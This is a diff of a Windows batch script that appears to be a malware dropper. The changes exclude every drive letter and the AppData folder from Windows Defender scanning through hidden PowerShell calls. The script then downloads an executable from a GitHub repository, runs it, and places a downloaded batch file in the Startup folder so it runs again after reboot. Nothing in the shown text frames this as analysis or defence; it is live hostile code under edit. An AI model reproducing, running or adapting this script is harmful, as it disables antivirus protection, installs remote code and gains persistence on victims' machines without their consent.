@@ -5,26 +5,27 @@ if %errorlevel% NEQ 0 (
     exit /b
 )
 
-:: Exclude all currently connected drives
-for /f "skip=1 tokens=1" %%D in ('wmic logicaldisk get name') do (
-    if not "%%D"=="" (
-        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%D\\'"
-    )
+:: Loop through all drive letters from A to Z
+for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+    powershell -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%%L:\' } catch {}"
 )
 
-:: Continue with your logic
+:: Exclude AppData path
 set "APPDATA_PATH=%USERPROFILE%\AppData"
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+
+:: Download and run your file
 set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
-
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
+:: Add startup script
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "AURA_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/Java.bat"
 set "AURA_BAT_FILE=%STARTUP_FOLDER%\Java.Bat"
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%AURA_BAT_URL%', '%AURA_BAT_FILE%')"
+
 exit
 
 :: By MrAboudi
